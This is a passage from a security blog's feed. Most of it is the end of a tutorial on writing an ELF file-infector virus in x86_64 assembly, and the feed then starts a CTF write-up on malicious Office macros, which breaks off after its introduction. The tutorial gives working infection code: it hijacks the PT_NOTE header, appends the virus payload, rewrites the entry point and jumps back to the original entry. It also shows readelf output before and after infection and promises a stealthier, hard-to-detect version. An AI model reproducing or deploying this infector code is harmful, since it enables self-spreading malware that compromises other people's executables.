&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; it will be on another page and also to keep&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                &lt;span style=&#34;color:#75715e&#34;&gt;; offset and address consistent&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; We put it after the last address mapped into memory&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_paddr], rcx                &lt;span style=&#34;color:#75715e&#34;&gt;; but we have to align it on another page&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]                &lt;span style=&#34;color:#75715e&#34;&gt;; We convert our infected segment&amp;#39;s address to&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; an offset in case remapping changes the map address&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This is the code that will handle the &lt;code&gt;PT_NOTE&lt;/code&gt; hijacking. If we want our program to execute, we need the new &lt;code&gt;PT_LOAD&lt;/code&gt; header to be valid so we will have to change a lot of its fields.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;p_type&lt;/code&gt;: We will switch it from &lt;code&gt;PT_NOTE&lt;/code&gt; to &lt;code&gt;PT_LOAD&lt;/code&gt; to tell the system that we want to map our code into the memory.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_flags&lt;/code&gt;: For &lt;code&gt;PT_LOAD&lt;/code&gt; segments, this field is used to define the permissions that will be granted to our segment. We will give it read and execute permissions because that&amp;rsquo;s all ot needs.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_offset&lt;/code&gt;: This field defines here the segment starts, since we are gonna put our code at the end of the file, we will put the file size value here.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_file/memsz&lt;/code&gt;: Those are used to tell the system the place it needs to reserve in memory and how many bytes of the file it has to put in. We will define both as the virus length (We will see how to get it later)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_p/vaddr&lt;/code&gt;: Those are the physical and virtual addresses where the segment will be mapped. It is said in the man that &lt;code&gt;Loadable process segments must have congruent values for p_vaddr and p_offset, modulo the page size.&lt;/code&gt; so we will take the page right after the last already existing &lt;code&gt;PT_LOAD&lt;/code&gt; and then add it the file size so that we are sure that he offset and addresses values have congruent values.&lt;/li&gt;
&lt;li&gt;&lt;code&gt;p_align&lt;/code&gt;: Loadable segments are aligned on memory pages so we will change it to the usual size of a page (0x1000 bytes)&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;adjust_file_size:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rsi, virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize], rsi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_FTRUNCATE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    eax, eax
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_new_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     r10, r10
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     r10b, MREMAP_MAYMOVE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MREMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;test&lt;/span&gt;    al, al
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jnz&lt;/span&gt;     munmap_quit_infect
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map], rax            &lt;span style=&#34;color:#75715e&#34;&gt;; This might break the reference to the phdrs&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                            &lt;span style=&#34;color:#75715e&#34;&gt;; but they are not needed anymore&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lea&lt;/span&gt;     rsi, [rel _start]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, virus_len
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;copy_payload:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;lodsb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;stosb&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;loop&lt;/span&gt;    copy_payload
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;patch_entrypoint:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     r8, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rax, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rax, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_notehdr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdx, [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry]          &lt;span style=&#34;color:#75715e&#34;&gt;; We save the old entrypoint&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_vaddr]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;QWORD&lt;/span&gt; [r8 &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; e_entry], rcx    &lt;span style=&#34;color:#75715e&#34;&gt;; We change the entrypoint to our code&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset        &lt;span style=&#34;color:#75715e&#34;&gt;; The address to patch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;sub&lt;/span&gt;     rdx, rcx                     &lt;span style=&#34;color:#75715e&#34;&gt;; We have the relative jump&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rcx, [rax &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; p_offset]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, r8
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;add&lt;/span&gt;     rcx, final_jmp_offset &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;; The file offset of the address to patch&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     &lt;span style=&#34;color:#66d9ef&#34;&gt;DWORD&lt;/span&gt; [rcx], edx             &lt;span style=&#34;color:#75715e&#34;&gt;; We return to the original entrypoint&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;munmap_quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MSYNC
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rdi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_map]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     rsi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_filesize]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_MUNMAP
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;close_quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     edi, [rsp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; inf_fd]
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_CLOSE
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;quit_infect:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;leave&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;ret&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    signature: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, SIGNATURE, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir1: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dir2: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;/tmp/test2/&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    cwd: &lt;span style=&#34;color:#66d9ef&#34;&gt;db&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;.&amp;#34;&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;_end:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;xor&lt;/span&gt;     rdi, rdi
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;mov&lt;/span&gt;     eax, SYS_EXIT
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;syscall&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Once our new segment has been created, it is time to put the code inside the file. Since we are working with a memory mapped file, we need to remap it to extend it first. Once this has been done, we just go to the previous end of the file and we copy the payload there. To get the size of our payload, we use the &lt;code&gt;_end&lt;/code&gt; beacon that we put at the end so that we can define &lt;code&gt;virus_len&lt;/code&gt; as &lt;code&gt;_end - _start&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Once our payload has been copied, the last step is to hijack the control flow to get it executed. To do that we will first add the following lines to &lt;code&gt;_start&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-nasm&#34; data-lang=&#34;nasm&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;jmp&lt;/span&gt;     _end
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;final_jmp_offset&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt; equ&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;$&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; _start
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;With this line, the program will cleanly quits after its first execution. We can also use this &lt;code&gt;jmp&lt;/code&gt; to jmp back to the original entrypoint after the virus execution. In x86_64 assembly, a jump is encoded as &lt;code&gt;opcode relative_offset&lt;/code&gt; starting from the &lt;code&gt;final_jmp_offset&lt;/code&gt; label.
We can obtain this offset with the formula : &lt;code&gt;old_entrypoint_address - final_jmp_offset&lt;/code&gt;.
Once we replaced the jmp address in the copied code, everything is set but there is still one thing to do for the infector to fully work : preserve its registers.
Indeed, the host program code might expect some special values in some register that we used (like &lt;code&gt;argc&lt;/code&gt; and &lt;code&gt;argv&lt;/code&gt; in &lt;code&gt;rdi&lt;/code&gt; and &lt;code&gt;rsi&lt;/code&gt;) so we will push those important registers at the very beginning of our program and pop them just before the final jump.&lt;/p&gt;
&lt;h3 id=&#34;conclusion&#34;&gt;Conclusion&lt;/h3&gt;
&lt;p&gt;We can now infect any ELF 64-bits of our system and get anything executed executed by it if we insert a real payload inside but we have a problem : our technique is not stealthy at all, we can be spotted by &lt;code&gt;readelf&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;readelf&lt;/code&gt; is a linux command that allows us to inspect ELF files, we will use it with the &lt;code&gt;-l&lt;/code&gt; option to display the program headers of a simple Hello World coded in C before and after infection.&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
Entry point 0x1050
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  NOTE           0x00000000000002c4 0x00000000000002c4 0x00000000000002c4
                 0x0000000000000044 0x0000000000000044  R      0x4
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;This is how a normal file looks like, it has 4 load segments including a single one that is executable for the code and a single one that is writable for the data segment. It also has a NOTE header that is containing notes about the program.&lt;/p&gt;
&lt;p&gt;After the infection, it will look more like :&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Elf file type is DYN (Shared object file)
Entry point 0x70e0
There are 11 program headers, starting at offset 64

Program Headers:
  Type           Offset             VirtAddr           PhysAddr
                 FileSiz            MemSiz              Flags  Align
  PHDR           0x0000000000000040 0x0000000000000040 0x0000000000000040
                 0x0000000000000268 0x0000000000000268  R      0x8
  INTERP         0x00000000000002a8 0x00000000000002a8 0x00000000000002a8
                 0x000000000000001c 0x000000000000001c  R      0x1
      [Requesting program interpreter: /lib64/ld-linux-x86-64.so.2]
  LOAD           0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000560 0x0000000000000560  R      0x1000
  LOAD           0x0000000000001000 0x0000000000001000 0x0000000000001000
                 0x00000000000001bd 0x00000000000001bd  R E    0x1000
  LOAD           0x0000000000002000 0x0000000000002000 0x0000000000002000
                 0x0000000000000158 0x0000000000000158  R      0x1000
  LOAD           0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000248 0x0000000000000250  RW     0x1000
  DYNAMIC        0x0000000000002df8 0x0000000000003df8 0x0000000000003df8
                 0x00000000000001e0 0x00000000000001e0  RW     0x8
  LOAD           0x00000000000040e0 0x00000000000070e0 0x00000000000070e0
                 0x000000000000038a 0x000000000000038a  R E    0x1000
  GNU_EH_FRAME   0x0000000000002014 0x0000000000002014 0x0000000000002014
                 0x000000000000003c 0x000000000000003c  R      0x4
  GNU_STACK      0x0000000000000000 0x0000000000000000 0x0000000000000000
                 0x0000000000000000 0x0000000000000000  RW     0x10
  GNU_RELRO      0x0000000000002de8 0x0000000000003de8 0x0000000000003de8
                 0x0000000000000218 0x0000000000000218  R      0x1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;We can now see that there is another load segment which has execution permissions. It is super weird and should not be there at all, we can also notice that obviously, the NOTE segment disappeared. Another odd thing is the fact that the entrypoint is pointing on that segment. The code segment is almost always mapped at 0x1000 and the entrypoint is usually at the beginning of it so 0x70e0 definitely doesn&amp;rsquo;t look legit.
This is how you can see that this file is not legitimate and probably infected without even the need to properly analyze it.&lt;/p&gt;
&lt;p&gt;Lucky for us, we are gonna learn how to make an infector that will not induce any peculiar change in the ELF file structure. It will keep the original entrypoint and it will not change the number of load segments nor their permissions.&lt;/p&gt;
&lt;p&gt;&lt;a href=&#34;https://alagroy-42.github.io/malware_dev/infector_advanced&#34;&gt;Part 2. Advanced infectors: How to make our infector stealthy and hardly detectable&lt;/a&gt;&lt;/p&gt;
</content>
    </item>
    
    <item>
      <title>New Era - [HTB UNICTF 2021 - Finals]</title>
      <link>https://alagroy-42.github.io/writeups/new_era/</link>
      <pubDate>Tue, 14 Jun 2022 18:39:26 +0200</pubDate>
      
      <guid>https://alagroy-42.github.io/writeups/new_era/</guid>
      <description>The Challenge For this challenge we had an ISO file that contains this Office document.
We are gonna use the oletool suite to try to see if there is anything suspicious in that file.
The oledump utility shows us that there are macros that appear suspicious. We are gonna use the olevba utility to get more infos on the macros
That definitely looks odd. Nonetheless, when we try to decode the base64 strings, it looks like non-sense so we are gonna try to look at the macro code.</description>
      <content>&lt;h2 id=&#34;the-challenge&#34;&gt;The Challenge&lt;/h2&gt;
&lt;p&gt;For this challenge we had an ISO file that contains &lt;a href=&#34;https://alagroy-42.github.io/writeups/new_era/office.doc&#34;&gt;this Office document&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We are gonna use the &lt;code&gt;oletool&lt;/code&gt; suite to try to see if there is anything suspicious in that file.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://alagroy-42.github.io/new_era_oledump.png&#34; alt=&#34;oledump&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;oledump&lt;/code&gt; utility shows us that there are macros that appear suspicious.
